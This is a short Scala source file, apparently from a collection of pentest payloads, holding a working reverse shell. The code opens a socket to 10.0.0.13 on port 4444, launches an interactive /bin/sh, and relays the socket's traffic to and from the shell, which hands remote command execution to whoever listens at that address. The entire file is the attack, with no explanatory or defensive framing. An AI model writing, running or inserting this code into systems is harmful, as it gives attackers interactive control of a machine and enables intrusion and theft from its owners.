// Scala reverse shell
import java.net.Socket
import scala.sys.process._

object Revshell {
  def main(args: Array[String]): Unit = {
    val s = new Socket("10.0.0.13", 4444)
    val pb = new ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true)
    val p = pb.start()
    new Thread(() => { val in = s.getInputStream; val out = p.getOutputStream
      val buf = new Array[Byte](4096); var n = in.read(buf)
      while (n > 0) { out.write(buf, 0, n); out.flush(); n = in.read(buf) } }).start()
    new Thread(() => { val in = p.getInputStream; val out = s.getOutputStream
      val buf = new Array[Byte](4096); var n = in.read(buf)
      while (n > 0) { out.write(buf, 0, n); out.flush(); n = in.read(buf) } }).start()
    p.waitFor()
    s.close()
  }
}
